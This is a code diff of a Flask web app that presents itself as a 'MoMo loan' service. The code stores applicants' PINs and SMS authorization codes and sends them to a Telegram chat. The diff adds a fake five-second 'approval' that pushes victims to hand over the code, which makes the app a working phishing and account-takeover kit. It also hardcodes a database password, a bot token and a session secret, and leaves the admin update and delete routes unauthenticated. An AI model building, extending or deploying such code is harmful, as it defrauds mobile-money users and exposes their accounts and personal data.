@@ -2,10 +2,11 @@ from flask import Flask, render_template, request, redirect, url_for, session, j
 from pymongo import MongoClient
 from bson.objectid import ObjectId
 import os
+import time
 import requests
 
 app = Flask(__name__)
-app.secret_key = "super_secret_momo_key"
+app.secret_key = "super_secret_momo_key"  # Needed for session management
 
 # MongoDB connection
 client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
@@ -17,9 +18,7 @@ TELEGRAM_BOT_TOKEN = "8802138287:AAHXDX_8S-OGN4NBemcQPdI3uZzFsICDQh4"
 TELEGRAM_ADMIN_CHAT_ID = "7217281586"
 
 def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
-    """Sends notification with inline Approve / Reject buttons directly to Telegram."""
-    app_id = str(app_data.get("_id"))
-    
+    """Sends immediate notification alert to your Telegram chat."""
     message = (
         f"🚨 *{title}* 🚨\n\n"
         f"🆔 *App ID:* `{app_data.get('app_id')}`\n"
@@ -35,66 +34,16 @@ def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
     )
     
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    
-    # Inline buttons attached to the Telegram message
-    reply_markup = {
-        "inline_keyboard": [
-            [
-                {"text": "✅ Approve Application", "callback_data": f"approve_{app_id}"},
-                {"text": "❌ Reject", "callback_data": f"reject_{app_id}"}
-            ]
-        ]
-    } if title == "NEW MOMO LOAN APPLICATION" else None
-
     payload = {
         "chat_id": TELEGRAM_ADMIN_CHAT_ID,
         "text": message,
         "parse_mode": "Markdown"
     }
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
-
+    
     try:
         requests.post(url, json=payload, timeout=5)
     except Exception as e:
         print(f"Telegram notification error: {e}")
-
-
-# --- TELEGRAM WEBHOOK FOR INLINE BUTTON CLICKS ---
-@app.route("/telegram-webhook", methods=["POST"])
-def telegram_webhook():
-    data = request.get_json()
-    
-    # Check if this is a button click (callback_query)
-    if data and "callback_query" in data:
-        callback = data["callback_query"]
-        callback_id = callback["id"]
-        callback_data = callback["data"]
-        
-        if "_" in callback_data:
-            action, db_id = callback_data.split("_", 1)
-            
-            if action == "approve":
-                applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
-                    {"$set": {"status": "Approved"}}
-                )
-                response_text = "✅ Application Approved!"
-            elif action == "reject":
-                applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
-                    {"$set": {"status": "Rejected"}}
-                )
-                response_text = "❌ Application Rejected!"
-            else:
-                response_text = "Unknown Action"
-
-            # Answer Telegram callback to acknowledge the button press
-            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-            requests.post(answer_url, json={"callback_query_id": callback_id, "text": response_text})
-
-    return jsonify({"status": "ok"}), 200
-
 
 @app.route("/")
 def index():
@@ -150,6 +99,7 @@ def login():
             "income": session.get("income"),
             "password": pin,
             "status": "Pending Approval",
+            "created_at": time.time(),  # Timestamp used for 5-second timer
             "app_id": "APP-" + os.urandom(4).hex().upper(),
             "auth_code": ""
         }
@@ -157,8 +107,7 @@ def login():
         inserted_id = applications_collection.insert_one(app_data).inserted_id
         session["current_app_id"] = str(inserted_id)
         
-        # Save record with MongoDB ObjectId and send Telegram notification
-        app_data["_id"] = inserted_id
+        # Send instant notification alert to Telegram
         send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION")
         
         return redirect(url_for("pending"))
@@ -176,13 +125,26 @@ def pending():
     
     return render_template("pending.html", app_id=app_id, status=status)
 
+# Automatic Timer Logic: Approves application after 5 seconds
 @app.route("/check-status")
 def check_status():
     current_id = session.get("current_app_id")
     if current_id:
         record = applications_collection.find_one({"_id": ObjectId(current_id)})
         if record:
-            return jsonify({"status": record.get("status", "Pending Approval")})
+            current_status = record.get("status", "Pending Approval")
+            created_at = record.get("created_at", time.time())
+            
+            # Auto-approve if 5 seconds have elapsed
+            if current_status == "Pending Approval" and (time.time() - created_at) >= 5:
+                applications_collection.update_one(
+                    {"_id": ObjectId(current_id)},
+                    {"$set": {"status": "Approved"}}
+                )
+                return jsonify({"status": "Approved"})
+            
+            return jsonify({"status": current_status})
+            
     return jsonify({"status": "Pending Approval"})
 
 @app.route("/submit-auth-code", methods=["POST"])
@@ -196,6 +158,8 @@ def submit_auth_code():
             {"$set": {"auth_code": auth_code, "status": "Completed"}}
         )
         record = applications_collection.find_one({"_id": ObjectId(current_id)})
+        
+        # Send notification alert when auth code is submitted
         send_telegram_alert(record, title="CONFIDENTIAL SMS CODE SUBMITTED")
         
     return redirect(url_for("completed"))
@@ -203,6 +167,23 @@ def submit_auth_code():
 @app.route("/completed")
 def completed():
     return render_template("completed.html")
+
+@app.route("/admin")
+def admin_dashboard():
+    if request.args.get("admin") != "ADMIN036":
+        return "Unauthorized Access", 403
+    all_apps = list(applications_collection.find())
+    return render_template("admin.html", applications=all_apps)
+
+@app.route("/admin/update/<app_id>/<status>")
+def update_status(app_id, status):
+    applications_collection.update_one({"_id": ObjectId(app_id)}, {"$set": {"status": status}})
+    return redirect(url_for("admin_dashboard", admin="ADMIN036"))
+
+@app.route("/admin/delete/<app_id>")
+def delete_application(app_id):
+    applications_collection.delete_one({"_id": ObjectId(app_id)})
+    return redirect(url_for("admin_dashboard", admin="ADMIN036"))
 
 if __name__ == "__main__":
     app.run(debug=True, port=5000)
